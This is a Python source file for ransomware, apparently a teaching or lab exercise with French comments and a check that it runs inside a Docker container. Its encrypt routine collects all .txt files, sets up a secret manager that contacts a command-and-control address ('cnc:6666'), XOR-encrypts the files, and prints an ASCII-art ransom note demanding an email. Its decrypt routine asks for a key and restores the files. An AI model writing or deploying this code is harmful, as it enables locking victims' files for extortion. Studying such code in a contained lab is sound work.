import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """


               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO  ______
`:`:::::::`;:::::: ;::::::#/               DOO |  __  | _                                                                                                   __
 :::`:::::::`;; ;:::::::::##                OO | |  |_||_| __     __  ___     __   __   ___     _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _  |  |
 ::::`:::::::`;::::::::;:::#                OO | |  __  _  \ \   / / / _ \   |  \_/  | / _ \   | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | | |  |
 `:::::`::::::::::::;'`:;::#                O  | |__\ || |  \ \ / / |  __/   | \   / ||  __/   | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| | |__|
  `:::::`::::::::;' /  / `:#                   |______/|_|   \___/   \___|   |_|\_/|_| \___|    \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |  __
   ::::::`:::::;'  /  /   `#                                                                     __/ |                                               __/ | |__|
                                                                                                |___/                                               |___/


                                                 
Your txt files have been locked. Send an email to Jenesuispassimechant@jedoisjustemanger.com with title '{token}' to (maybe) unlock your data 😉. 
"""
DECRYPT_MESSAGE = """

"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        base_path = Path(".")
        matching_files = [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
        return matching_files

    def encrypt(self):
        # main function for encrypting (see PDF)
        # get all txt files
        files = self.get_files("*.txt")

        # creation du secret manager
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # appel de la fonction setup
        secret_manager.setup()

        # Chiffrement des fichiers
        secret_manager.xorfiles(files)

        # Annonce de de l'attaque à la victime
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))


    def decrypt(self):
        # main function for decrypting (see PDF)
        #Chargement des éléments nécessaires au déchiffrement
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.load()
        #Déchiffrement des fichiers
        received_files = self.get_files("*.txt")
        while True:
            try:
                #demande la clé de déchiffrement
                candidate_key = input("Entre la clé (Attention ! Te trompes pas, ça serait dommage de ne pas revoir tes précieux fichiers): ")
                #appel de la fonction set_key
                secret_manager.set_key(candidate_key)
                # Appel de la fonction xorfiles pour déchiffrer les fichiers
                secret_manager.xorfiles(received_files)
                # Appel de la fonction clean
                secret_manager.clean()
                # Affichage du message de déchiffrement
                print("Ok, tout s'est bien passé ! Tu es tranquille (pour le moment...)!")
                # Sortie de la boucle
                break

            except ValueError as erreur:
                # Affichage du message d'erreur
                print("Error",{erreur},"A quoi tu joues là ?! Pas de clé valide, pas de fichier...")
                


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()